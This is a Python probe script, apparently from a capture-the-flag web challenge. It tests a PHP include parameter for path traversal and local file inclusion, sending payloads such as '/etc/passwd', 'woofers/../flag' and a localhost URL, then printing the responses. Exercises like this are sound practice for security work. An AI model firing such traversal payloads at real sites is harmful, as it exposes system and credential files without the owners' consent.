"""Round 5: full body of the flag include + 502-pattern mapping + direct paths."""
import re
import urllib.parse
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="
ROOT = "http://noctf.fa1lsnow.com:40547/"

MAP = [
    ("/etc/hostname", None),
    ("/etc/passwd", None),
    ("http://127.0.0.1/", None),
    ("foo://bar", None),
    ("x:/", None),
    ("woofers/etc/passwd", None),
    ("woofers/../etc/passwd", None),
    ("woofers/../flag", None),
]


def fetch(url, raw=False):
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


print("=== FULL BODY: woofers/../flag ===")
st, body = fetch(BASE + urllib.parse.quote("woofers/../flag", safe="/%"))
print("status", st)
print(body)

print("\n=== MAP ===")
for cat, _ in MAP:
    st, body = fetch(BASE + urllib.parse.quote(cat, safe="/%:"))
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:120]
        if "Sorry" in body:
            note += " [SORRY]"
    print(f"[{st}] {cat!r} -> {note}")

print("\n=== DIRECT PATHS ===")
for p in ["flag.php", "flag", "index.php", "woofers.php", "meowers.php"]:
    st, body = fetch(ROOT + p)
    snippet = re.sub(r"\s+", " ", body)[:200] if isinstance(body, str) else ""
    print(f"[{st}] /{p} -> {snippet}")
